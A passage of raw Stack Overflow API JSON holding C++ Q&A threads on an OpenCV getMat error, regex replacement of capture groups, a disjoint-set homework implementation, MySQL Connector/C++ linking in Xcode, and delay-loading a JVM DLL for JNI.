rel=\"nofollow\">this example</a>, the <code>model</code> in the following line is a <em>pointer</em> to a <code>FaceRecognizer</code> class instance, instead of the object itself. </p>\n\n<pre><code>129:    Ptr&lt;FaceRecognizer&gt; model = createEigenFaceRecognizer();\n        ...\n143:    Mat eigenvalues = model-&gt;getMat(\"eigenvalues\");\n</code></pre>\n\n<p>Thus, it makes sense that the <code>getMat</code> function is not defined in <code>FaceRecognizer</code> class, but it should be defined for <code>Ptr&lt;FaceRecognizer&gt;</code>.</p>\n"}], "owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1724, "favorite_count": 1, "accepted_answer_id": 32642027, "answer_count": 1, "score": 3, "last_activity_date": 1442536035, "creation_date": 1429740480, "last_edit_date": 1495541337, "question_id": 29809812, "link": "https://stackoverflow.com/questions/29809812/error-no-member-named-getmat-in-cvfacefacerecognizer", "title": "error: no member named &#39;getMat&#39; in &#39;cv::face::FaceRecognizer&#39;", "body": "<p>I am using <code>opencv-3.0</code>, to implement this <a href=\"http://docs.opencv.org/modules/contrib/doc/facerec/facerec_tutorial.html\" rel=\"nofollow noreferrer\">opencv facial recognition demo</a> from the opencv docs.</p>\n\n<p>I believe this demo was written using <code>opencv-2.4</code>. However, I have added the <code>contrib</code> src to my build, as was advised in this <a href=\"https://stackoverflow.com/questions/29806834/fatal-error-opencv2-contrib-contrib-hpp-file-not-found-open-cv-already-built/29806967?noredirect=1#comment47742059_29806967\">SO answer</a>.</p>\n\n<p>However, I now receive the following error:</p>\n\n<pre><code>error: no member named 'getMat' in 'cv::face::FaceRecognizer'\n</code></pre>\n\n<p>The offending code is</p>\n\n<pre><code>Mat eigenvalues = model-&gt;FaceRecognizer::getMat(\"eigenvalues\");\n</code></pre>\n\n<p>I am compiling my code like so</p>\n\n<pre><code>g++ -o facerec_demo facerec_demo.cpp `pkg-config --cflags --libs opencv`\n</code></pre>\n\n<p>Is there a way to fix this, or is this demo completely incompatible with <code>opencv-3.0</code>?  </p>\n"}, {"tags": ["c++", "regex", "c++11", "regex-group"], "comments": [{"owner": {"reputation": 64040, "user_id": 3620003, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QnqtZ.jpg?s=128&g=1", "display_name": "timgeb", "link": "https://stackoverflow.com/users/3620003/timgeb"}, "edited": false, "score": 2, "creation_date": 1429744309, "post_id": 29809811, "comment_id": 47749118, "body": "This is infuriating. My first idea was to use ${1}, but this is not supported. My next idea was to use a named capturing group - which is not supported. I&#39;m really curious about the correct answer."}, {"owner": {"reputation": 3932, "user_id": 233981, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/26b77ef1ab3e3df3df030435aea70568?s=128&d=identicon&r=PG", "display_name": "srking", "link": "https://stackoverflow.com/users/233981/srking"}, "reply_to_user": {"reputation": 64040, "user_id": 3620003, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QnqtZ.jpg?s=128&g=1", "display_name": "timgeb", "link": "https://stackoverflow.com/users/3620003/timgeb"}, "edited": false, "score": 0, "creation_date": 1429744675, "post_id": 29809811, "comment_id": 47749240, "body": "@timgeb - yes, i&#39;m migrating from boost::regex where ${1} worked fine."}], "answers": [{"comments": [{"owner": {"reputation": 3932, "user_id": 233981, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/26b77ef1ab3e3df3df030435aea70568?s=128&d=identicon&r=PG", "display_name": "srking", "link": "https://stackoverflow.com/users/233981/srking"}, "edited": false, "score": 0, "creation_date": 1429742195, "post_id": 29810121, "comment_id": 47748366, "body": "Thanks Migara.  While true for the example, appending is not an option in my real code."}], "tags": [], "owner": {"reputation": 154, "user_id": 4656475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7oAWq.jpg?s=128&g=1", "display_name": "Zara Kay", "link": "https://stackoverflow.com/users/4656475/zara-kay"}, "is_accepted": false, "score": 0, "last_activity_date": 1429741883, "creation_date": 1429741883, "answer_id": 29810121, "question_id": 29809811, "link": "https://stackoverflow.com/questions/29809811/c11-regex-digit-after-capturing-group-in-replacement-string/29810121#29810121", "title": "C++11 regex: digit after capturing group in replacement string", "body": "<p>I tried to find a method of simply escaping the space or something so it wouldn't print, but I was unable to.</p>\n\n<p>However, the bit you are trying to add in, could be simply appended to the end of the regex output:</p>\n\n<pre><code>cout &lt;&lt; regex_replace( \"foobar0x1\", regex_a, \"$1\" ) &lt;&lt; \"0xNUM\" &lt;&lt; endl;\n</code></pre>\n\n<p>The above line would give you the output you want.</p>\n"}, {"tags": [], "owner": {"reputation": 17641, "user_id": 16800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ea1de76c4c343fc844135e18da8a80f1?s=128&d=identicon&r=PG", "display_name": "Guvante", "link": "https://stackoverflow.com/users/16800/guvante"}, "is_accepted": true, "score": 12, "last_activity_date": 1429769191, "last_edit_date": 1429769191, "creation_date": 1429745425, "answer_id": 29810807, "question_id": 29809811, "link": "https://stackoverflow.com/questions/29809811/c11-regex-digit-after-capturing-group-in-replacement-string/29810807#29810807", "title": "C++11 regex: digit after capturing group in replacement string", "body": "<p>You are allowed to either specify <code>$n</code> or <code>$nn</code> to reference captured text, thus you can use the <code>$nn</code> format (here <code>$01</code>) to avoid grabbing the <code>0</code>.</p>\n\n<pre><code>cout &lt;&lt; regex_replace( \"foobar0x1\", regex_a, \"$010xNUM\" ) &lt;&lt; endl;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 52749, "user_id": 1400768, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tM0N8.png?s=128&g=1", "display_name": "nhahtdh", "link": "https://stackoverflow.com/users/1400768/nhahtdh"}, "is_accepted": false, "score": 5, "last_activity_date": 1429783527, "last_edit_date": 1592644375, "creation_date": 1429771897, "answer_id": 29815801, "question_id": 29809811, "link": "https://stackoverflow.com/questions/29809811/c11-regex-digit-after-capturing-group-in-replacement-string/29815801#29815801", "title": "C++11 regex: digit after capturing group in replacement string", "body": "<p>Guvante has provided <a href=\"https://stackoverflow.com/a/29810807/\">a solution</a> to this problem.</p>\n<p><strong>However, is the behavior well-defined according to the specification?</strong></p>\n<p>To start from the conclusion. <strong>Yes, the solution has well-defined behavior.</strong></p>\n<h2>C++ specification</h2>\n<p>The documentation of <a href=\"http://en.cppreference.com/w/cpp/regex/match_flag_type\" rel=\"nofollow noreferrer\"><code>format_default</code></a>, which specifies ECMA rules to interpret the format string, points to Section 15.5.4.11 of ECMA-262.</p>\n<h2>ECMA-262 specification</h2>\n<p>According to Table 22 in <a href=\"http://ecma-international.org/ecma-262/5.1/#sec-15.5.4.11\" rel=\"nofollow noreferrer\">Section 15.5.4.11 of ECMA-262 specification</a></p>\n<blockquote>\n<p><code>$n</code></p>\n<p>The nth capture, where n is a single digit in the range 1 to 9 and <code>$n</code> is not followed by a decimal digit. If n \u2264 m and the nth capture is undefined, use the empty String instead. If n &gt; m, the result is implementation-defined.</p>\n<p><code>$nn</code></p>\n<p>The nnth capture, where nn is a two-digit decimal number in the range 01 to 99. If nn \u2264 m and the nnth capture is undefined, use the empty String instead. If nn &gt; m, the result is implementation-defined.</p>\n</blockquote>\n<p>The variable m is defined in previous paragraph in the same section:</p>\n<blockquote>\n<p>[...] Let m be the number of left capturing parentheses in <code>searchValue</code> (using <code>NcapturingParens</code> as specified in 15.10.2.1).</p>\n</blockquote>\n<h2>Replacement string in the question <code>&quot;$10xNUM&quot;</code></h2>\n<p>Back at the code in the question:</p>\n<pre><code>cout &lt;&lt; regex_replace( &quot;foobar0x1&quot;, regex_a, &quot;$10xNUM&quot; ) &lt;&lt; endl;\n</code></pre>\n<p>Since <code>$1</code> is followed by <code>0</code>, it has to be interpreted as the second rule <code>$nn</code>, as the first rule forbids any digit to follow <code>$n</code>. However, since the pattern only has 2 capturing groups (m = 2) and 10 &gt; 2, the behavior is <strong>implementation-defined</strong> according to the specification.</p>\n<p>We can see the effect of the implementation-defined clause by comparing the result of functionally equivalent JavaScript code in Firefox 37.0.1:</p>\n<pre><code>&gt; &quot;foobar0x1&quot;.replace(/(.*)bar(.*)/g, &quot;$10xNUM&quot; )\n&lt; &quot;foo0xNUM&quot;\n</code></pre>\n<p>As you can see, Firefox decided to interpret <code>$10</code> as taking the value of the first capturing group <code>$1</code>, then followed by the fixed string <code>0</code>. This is a valid implementation according to the specification, under the condition in <code>$nn</code> clause.</p>\n<h2>Replacement string in Guvante's answer: <code>&quot;$010xNUM&quot;</code></h2>\n<p>Same as above, <code>$nn</code> clause is used, since <code>$n</code> clause forbids any digit to follow. Since 01 in <code>$01</code> is less than the number of capturing groups (m = 2), the behavior is well-defined, which is to use the content of capturing group 1 in the replacement.</p>\n<p>Therefore, Guvante's answer will return the same result on any complaint C++ compiler.</p>\n"}], "owner": {"reputation": 3932, "user_id": 233981, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/26b77ef1ab3e3df3df030435aea70568?s=128&d=identicon&r=PG", "display_name": "srking", "link": "https://stackoverflow.com/users/233981/srking"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2668, "favorite_count": 1, "accepted_answer_id": 29810807, "answer_count": 3, "score": 15, "last_activity_date": 1429783527, "creation_date": 1429740477, "last_edit_date": 1429744545, "question_id": 29809811, "link": "https://stackoverflow.com/questions/29809811/c11-regex-digit-after-capturing-group-in-replacement-string", "title": "C++11 regex: digit after capturing group in replacement string", "body": "<p>My regex_replace expression uses group $1 right before a '0' character in the replacement string like so:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;regex&gt;\n\nusing namespace std;\n\nint main() {\n    regex regex_a( \"(.*)bar(.*)\" );\n    cout &lt;&lt; regex_replace( \"foobar0x1\", regex_a, \"$10xNUM\" ) &lt;&lt; endl;\n    cout &lt;&lt; regex_replace( \"foobar0x1\", regex_a, \"$1 0xNUM\" ) &lt;&lt; endl;\n}\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>xNUM\nfoo 0xNUM\n</code></pre>\n\n<p>I'm trying to get output <code>foo0xNUM</code> without the middle whitespace.</p>\n\n<p>How do I guard the group name $1 from the next character in the substitution string?</p>\n"}, {"tags": ["c++", "implementation", "doubly-linked-list", "disjoint-sets"], "comments": [{"owner": {"reputation": 13642, "user_id": 4013258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d423395e1033fa23d80a5561ab170fa?s=128&d=identicon&r=PG&f=1", "display_name": "Surt", "link": "https://stackoverflow.com/users/4013258/surt"}, "edited": false, "score": 0, "creation_date": 1429745206, "post_id": 29809803, "comment_id": 47749434, "body": "Couldn&#39;t you simplify a lot of the code by using std::list and some standard algorithms from the STL?"}, {"owner": {"reputation": 11, "user_id": 4817276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be26bc2cca7f348d0bb28e27e0fee3fd?s=128&d=identicon&r=PG&f=1", "display_name": "Matt6500", "link": "https://stackoverflow.com/users/4817276/matt6500"}, "reply_to_user": {"reputation": 13642, "user_id": 4013258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d423395e1033fa23d80a5561ab170fa?s=128&d=identicon&r=PG&f=1", "display_name": "Surt", "link": "https://stackoverflow.com/users/4013258/surt"}, "edited": false, "score": 0, "creation_date": 1429758279, "post_id": 29809803, "comment_id": 47753514, "body": "I definitely could, but for the assignment my professor wants us to use the Doubly Linked List that we made in a previous lab"}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "reply_to_user": {"reputation": 2079, "user_id": 378386, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Jy6QN.png?s=128&g=1", "display_name": "aggsol", "link": "https://stackoverflow.com/users/378386/aggsol"}, "edited": false, "score": 0, "creation_date": 1429779867, "post_id": 29809803, "comment_id": 47763922, "body": "@CodeClown Code Review is not for assisting in adding new implementation. This code does not seem to work as intended yet."}], "owner": {"reputation": 11, "user_id": 4817276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be26bc2cca7f348d0bb28e27e0fee3fd?s=128&d=identicon&r=PG&f=1", "display_name": "Matt6500", "link": "https://stackoverflow.com/users/4817276/matt6500"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 373, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429779270, "creation_date": 1429740451, "last_edit_date": 1429779270, "question_id": 29809803, "link": "https://stackoverflow.com/questions/29809803/c-disjoint-set-implementation-with-doubly-linked-lists", "title": "C++ Disjoint Set Implementation with Doubly Linked Lists", "body": "<p>Can someone help me find/make/point me in the right direction of a disjoint set implementation using Doubly Linked Lists? I have some supplemental code and I've already started editing it, I was wondering if someone could help me fill the rest in or at least give me some pointers on how to do so.</p>\n\n<h1>DisjointSet.h</h1>\n\n<pre><code>#pragma once\n\n#include \"TemplateDoublyLinkedList.h\"\n#include &lt;cstddef&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\n// Disjoint Set\ntemplate &lt;typename T&gt;\nclass DisjointSet {\nprivate:\n    vector&lt;DListNode&lt;T&gt;*&gt; nodeLocator;\npublic:\n    ~DisjointSet();\n    DisjointSet(int n) { nodeLocator.resize(n); }\n    vector&lt;DListNode&lt;T&gt;*&gt; getNodeLocator() const { return nodeLocator; }\n    DListNode&lt;T&gt;* MakeSet(int key, T node);\n    DListNode&lt;T&gt;* Union(DListNode&lt;T&gt; nodeI, DListNode&lt;T&gt; nodeJ);\n    DListNode&lt;T&gt;* FindSet(DListNode&lt;T&gt; node);\n    DListNode&lt;T&gt;* FindSet(int nodeKey);\n};\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DisjointSet&lt;T&gt;::MakeSet(int key, T node)\n{\n    DListNode&lt;T&gt; *temp = new DListNode(key, node);\n    nodeLocator.insert(nodeLocator.begin() + key - 1, temp);\n    return temp;\n}\n\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DisjointSet&lt;T&gt;::Union(DListNode&lt;T&gt; nodeI, DListNode&lt;T&gt; nodeJ){\n    if (nodeI.getListSize() &gt;= nodeJ.getListSize())\n    {\n        nodeI.getTrailer()-&gt;setNext(nodeJ.getRepresentative());\n        nodeJ.getRepresentative()-&gt;setPrevious(nodeI.getTrailer());\n        nodeI.getRepresentative()-&gt;setTrailer(nodeJ.getTrailer());\n        nodeJ.getRepresentative()-&gt;setTrailer(NULL);\n        nodeJ.getRepresentative()-&gt;setRepresentative(nodeI.getRepresentative());\n        nodeI.setListSize(nodeI.getListSize()+nodeJ.getListSize());\n\n        return nodeI.getRepresentative();\n    }\n    else if (nodeI.getListSize() &lt; nodeJ.getListSize())\n    {\n        nodeJ.getTrailer()-&gt;setNext(nodeI.getRepresentative());\n        nodeI.getRepresentative()-&gt;setPrevious(nodeJ.getTrailer());\n        nodeJ.getRepresentative()-&gt;setTrailer(nodeI.getTrailer());\n        nodeI.getRepresentative()-&gt;setTrailer(NULL);\n        nodeI.getRepresentative()-&gt;setRepresentative(nodeJ.getRepresentative());\n        nodeJ.setListSize(nodeI.getListSize() + nodeJ.getListSize());\n\n        return nodeJ.getRepresentative();\n    }\n    return NULL;\n}\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DisjointSet&lt;T&gt;::FindSet(DListNode&lt;T&gt; node){\n\n}\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DisjointSet&lt;T&gt;::FindSet(int nodeKey){\n    if (nodeLocator[nodeKey-1]) != NULL)\n        return nodeLocator[nodeKey-1];\n    else\n        return nullptr;\n}\n\ntemplate &lt;typename T&gt;\nostream&amp; DisjointSet&lt;T&gt;::operator&lt;&lt;(ostream&amp; out, const DisjointSet&lt;T&gt;&amp; ds){\n\n}\n</code></pre>\n\n<h1>TemplateDoublyLinkedList.h</h1>\n\n<pre><code>#pragma once\n\n#include &lt;string&gt;\n#include &lt;cstdlib&gt;\n#include &lt;iostream&gt;\n#include &lt;stdexcept&gt;\nusing namespace std;\n\n// list node\ntemplate &lt;typename T&gt;\nclass DListNode {\nprivate:\n  friend class DisjointSet;\n  int key, listSize;\n  T obj;\n  DListNode *prev, *next, *representative; \n  DListNode *trailer; //just the representative node has this pointer assigned\npublic:\n  DListNode(int k, T e, DListNode *p = NULL, DListNode *n = NULL)\n    : key(k), obj(e), prev(p), next(n) { listSize = 1; }\n  T getElem() const { return obj; }\n  T&amp; getElemt() { return obj; }\n  DListNode&lt;T&gt; * getNext() const { return next; }\n  DListNode&lt;T&gt; * getPrev() const { return prev; }\n  void setNext(DListNode* n) { this-&gt;next = n; }\n  void setPrevious(DListNode* p) { this-&gt;prev = p; }\n  DListNode&lt;T&gt;* insert_before(T d); // insert the int before this node\n  // return a pointer to the inserted node\n  DListNode&lt;T&gt;* insert_after(T d); // insert the int after this node\n  // return a pointer to the inserted node\n  void delete_before(); // delete the node before this node\n  void delete_after(); // delete the node after this node\n  int getKey() { return key; }\n  DListNode&lt;T&gt;* getRepresentative() const { return representative; }\n  DListNode&lt;T&gt;* getTrailer() const { return trailer; }\n  void setRepresentative(DListNode* rep);\n  void setTrailer(DListNode* trail);\n  int getListSize() { return this-&gt;getRepresentative()-&gt;listSize; }\n  void setListSize(int lSize) \n { this-&gt;listSize = lSize; if(this-&gt;next != NULL) this-&gt;next-&gt;setListSize(lSize); }\n};\n\ntemplate &lt;typename T&gt;\nvoid DListNode&lt;T&gt;::setRepresentative(DListNode* rep) {\n  this-&gt;representative = rep;\n  if (this-&gt;next != NULL)\n  {\n      this-&gt;next-&gt;setRepresentative(rep);\n  }\n}\n\ntemplate &lt;typename T&gt;\nvoid DListNode&lt;T&gt;::setTrailer(DListNode* trail) {\n  this-&gt;representative = trail;\n}\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DListNode&lt;T&gt;::insert_before(T d) {\n  DListNode&lt;T&gt;* temp = new DListNode(d);  //temp pointer // 1 OPERATION\n\n  if(prev!= NULL){   //if previous is not null // 2 OPERATION\n    temp -&gt; next = this;    //initialize next // 2 OPERATION\n    temp -&gt; prev = prev;   //initialize previous // 2 OPERATION\n    prev -&gt; next = temp;   // insert in the list  // 2 OPERATION\n    prev = temp;          // 1 OPERATION\n  }\n  else{       //if null than do a simple insert\n    temp -&gt; next = this;  // 2 OPERATION\n    prev = temp;   // 1 OPERATION\n  }\n\n  return temp; // 1 OPERATION\n}\n\ntemplate &lt;typename T&gt;\nDListNode&lt;T&gt;* DListNode&lt;T&gt;::insert_after(T d) {\n  DListNode&lt;T&gt;* temp = new DListNode(d);   // 2 OPERATION\n  if(next != NULL){   //if next is not null do this // 2 OPERATION\n    temp -&gt; next = next;      //initialize next and previous // 2 OPERATION\n    temp -&gt; prev = this;     // 2 OPERATION\n    next -&gt; prev = temp;   //make the connection to insert // 2 OPERATION\n    next = temp; // 1 OPERATION\n  }\n  else{ //if null than do a simple insert\n    temp -&gt; prev = this;  // 2 OPERATION\n    next = temp; // 1 OPERATION\n  }\n\n  return temp;  // 1 OPERATION\n}\n\ntemplate &lt;typename T&gt;\nvoid DListNode&lt;T&gt;::delete_before() {\n  if(prev!= NULL){   //check if something is there  // 2 OPERATION\n    DListNode&lt;T&gt;* temp = prev;         // 1 OPERATION\n    temp -&gt; prev-&gt; next = temp-&gt; next;    //change the interconnections  // 4 OPERATION\n    temp -&gt; next -&gt; prev = temp -&gt; prev; // 4 OPERATION\n    delete temp;        //delete the element // 1 OPERATION\n  }\n  else{\n    cout &lt;&lt; \"&gt;Error: Nothing is there :(\" &lt;&lt; endl;\n  }\n}\ntemplate &lt;typename T&gt;\nvoid DListNode&lt;T&gt;::delete_after() {\n  if(next != NULL){ //check if something is there\n    DListNode&lt;T&gt;* temp = next;  // 1 OPERATION\n    next -&gt; prev = this; //change the interconnections // 2 OPERATION\n    next = next -&gt; next; // 2 OPERATION\n    delete temp;  //delete the element // 1 OPERATION\n  }\n  else{\n    cout &lt;&lt; \"&gt;Error: Nothing is there :(\" &lt;&lt; endl;\n  }\n\n}\n</code></pre>\n"}, {"tags": ["c++", "mysql", "xcode"], "comments": [{"owner": {"reputation": 473, "user_id": 4497047, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c81e2386592eedf7bb0f2f4ecbaf7cff?s=128&d=identicon&r=PG&f=1", "display_name": "jbd36", "link": "https://stackoverflow.com/users/4497047/jbd36"}, "edited": false, "score": 0, "creation_date": 1429775965, "post_id": 29809775, "comment_id": 47761301, "body": "I&#39;ve also tried to add the library manually in the target&#39;s build phases, but that didn&#39;t work either. Any other suggestions?"}], "answers": [{"comments": [{"owner": {"reputation": 867, "user_id": 2028594, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/face217ab8848f1a578cf78d40e02752?s=128&d=identicon&r=PG", "display_name": "Payedimaunt", "link": "https://stackoverflow.com/users/2028594/payedimaunt"}, "edited": false, "score": 0, "creation_date": 1454959631, "post_id": 30689046, "comment_id": 58266781, "body": "Ok... I&#39;m a noob in c++ could you explain a bit better with some screenshot?"}], "tags": [], "owner": {"reputation": 11, "user_id": 3570472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eef27e8d09835f50361fa9ac3e63cf9a?s=128&d=identicon&r=PG&f=1", "display_name": "Og M", "link": "https://stackoverflow.com/users/3570472/og-m"}, "is_accepted": false, "score": 1, "last_activity_date": 1433638977, "creation_date": 1433638977, "answer_id": 30689046, "question_id": 29809775, "link": "https://stackoverflow.com/questions/29809775/using-mysql-connector-c-in-xcode-libmysqlcppconn-library-not-found/30689046#30689046", "title": "Using MySQL Connector/C++ in Xcode: -libmysqlcppconn library not found", "body": "<p>If you are using the Static MySQL Connector/C++ Library, did you link both library files: libmysqlcppconn-static.a and libmysqlclient.a? Do that in Xcode in the \"Build Phases\" tab under \"Link Binary With Libraries\" section. After you add those files make sure that the library search paths you provided point to the file locations.\nFor Dynamic Library instead you link the libmysqlcppconn.so file.</p>\n"}], "owner": {"reputation": 473, "user_id": 4497047, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c81e2386592eedf7bb0f2f4ecbaf7cff?s=128&d=identicon&r=PG&f=1", "display_name": "jbd36", "link": "https://stackoverflow.com/users/4497047/jbd36"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1377, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1433638977, "creation_date": 1429740354, "question_id": 29809775, "link": "https://stackoverflow.com/questions/29809775/using-mysql-connector-c-in-xcode-libmysqlcppconn-library-not-found", "title": "Using MySQL Connector/C++ in Xcode: -libmysqlcppconn library not found", "body": "<p>I'm trying to use MySQL Connector/C++ within Xcode. I have installed MySQL server. I also installed MySQL Connector/C++ and Boost using brew. I believe all files are where they should be.</p>\n\n<p>I've included library search paths:</p>\n\n<p>1) /usr/local/mysql-5.6.24-osx10.8-x86_64/lib</p>\n\n<p>2) /usr/local/mysql/lib</p>\n\n<p>I am just trying to get simple code to run before I dive a little deeper:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;iostream&gt;\n\n#include \"mysql_connection.h\"\n#include \"mysql_driver.h\"\n#include &lt;cppconn/driver.h&gt;\n#include &lt;cppconn/exception.h&gt;\n#include &lt;cppconn/resultset.h&gt;\n#include &lt;cppconn/statement.h&gt;\n#include &lt;cppconn/prepared_statement.h&gt;\n\nusing namespace std;\n\nint main(int argc, const char * argv[]) {\n\n    sql::mysql::MySQL_Driver *driver;\n    sql::Connection *con;\n\n    driver = sql::mysql::get_mysql_driver_instance();\n\n    con = driver-&gt;connect(\"tcp://127.0.0.1:3306\", \"user\", \"password\");\n\n    delete con;\n\n    return 0;\n}\n</code></pre>\n\n<p>The error I'm getting is: <code>ld: library not found for -libmysqlcppconn</code></p>\n\n<p>Any help would be greatly appreciated!</p>\n"}, {"tags": ["java", "c++", "java-native-interface", "c-preprocessor"], "comments": [{"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1429740409, "post_id": 29809735, "comment_id": 47747590, "body": "It is really really necessary that both variants are in one program? (It&#180;s possible of course, but...). Two programs (from the same code with different preprocessor stuff), optionally with some start code to check if Java is there and select the right variant, is easier."}, {"owner": {"reputation": 647, "user_id": 638127, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60293d88c7697c55249ede709a4850b5?s=128&d=identicon&r=PG", "display_name": "zz3599", "link": "https://stackoverflow.com/users/638127/zz3599"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1429741389, "post_id": 29809735, "comment_id": 47748010, "body": "Yeah, it&#39;s the constraint I have to work with. I think I&#39;ll just add the jvm.dll even in the case where I don&#39;t need to call Java."}], "answers": [{"comments": [{"owner": {"reputation": 647, "user_id": 638127, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60293d88c7697c55249ede709a4850b5?s=128&d=identicon&r=PG", "display_name": "zz3599", "link": "https://stackoverflow.com/users/638127/zz3599"}, "edited": false, "score": 0, "creation_date": 1429745664, "post_id": 29810051, "comment_id": 47749602, "body": "Even though ultimately I didn&#39;t use this, if we had a normal build system this would be the right way to go. Thanks!"}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "reply_to_user": {"reputation": 647, "user_id": 638127, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60293d88c7697c55249ede709a4850b5?s=128&d=identicon&r=PG", "display_name": "zz3599", "link": "https://stackoverflow.com/users/638127/zz3599"}, "edited": false, "score": 0, "creation_date": 1429783106, "post_id": 29810051, "comment_id": 47766427, "body": "You can also do this from the command line, there&#39;s not a lot of magic involved."}], "tags": [], "owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "is_accepted": true, "score": 2, "last_activity_date": 1429741583, "creation_date": 1429741583, "answer_id": 29810051, "question_id": 29809735, "link": "https://stackoverflow.com/questions/29809735/conditionally-call-jni-in-c/29810051#29810051", "title": "Conditionally call JNI in C++", "body": "<p>Since you mention \"DLL\" I'll assume Windows. The simple solution is something called delay-loading. This prevents a DLL from being loaded at startup, but only when it's first called. No call, no load, no problem if the DLL is missing. Just a setting in MSVC.</p>\n"}], "owner": {"reputation": 647, "user_id": 638127, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/60293d88c7697c55249ede709a4850b5?s=128&d=identicon&r=PG", "display_name": "zz3599", "link": "https://stackoverflow.com/users/638127/zz3599"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "accepted_answer_id": 29810051, "answer_count": 1, "score": 1, "last_activity_date": 1467719260, "creation_date": 1429740198, "last_edit_date": 1467719260, "question_id": 29809735, "link": "https://stackoverflow.com/questions/29809735/conditionally-call-jni-in-c", "title": "Conditionally call JNI in C++", "body": "<p>I have C++ code that needs to run on two different environments - one with Java installed, one without. In the Java environment, it will need to make JNI calls.</p>\n\n<p>My current setup is as follows: </p>\n\n<p>Main.cpp:</p>\n\n<pre><code>#include \"JNIInterface.h\"\nif(useJNI){\n    JNIInterface::DoJNIStuff();\n} else {\n    DoNormalStuff();\n}\n</code></pre>\n\n<p>JNIInterface.h: </p>\n\n<pre><code>#include &lt;mutex&gt;\n//has no &lt;jni.h&gt; include\n...\n</code></pre>\n\n<p>JNIInterface.cpp: </p>\n\n<pre><code>#include \"JNIInterface.h\"\n#include &lt;jni.h&gt;\nvoid JNIInterface::DoJNIStuff()\n{   std::call_once(jvmFlag, [](){\n        //basically all the JVM initialization stuff    \n    });\n    DoStuff(jvm);\n}\n</code></pre>\n\n<p>As expected, on the non-Java environment it results in \"The program can't start because JVM.dll is missing from your computer\". </p>\n\n<p>It seems like the only way is to avoid including the JNI code at compile time in the preprocessor. Is there a different setup to avoid this issue?</p>\n"}, {"tags": ["c++", "c++11", "makefile"], "comments": [{"owner": {"reputation": 691, "user_id": 1291457, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/0c2de53b1653add71f472e35a12b856c?s=128&d=identicon&r=PG", "display_name": "Charles", "link": "https://stackoverflow.com/users/1291457/charles"}, "edited": false, "score": 1, "creation_date": 1429740476, "post_id": 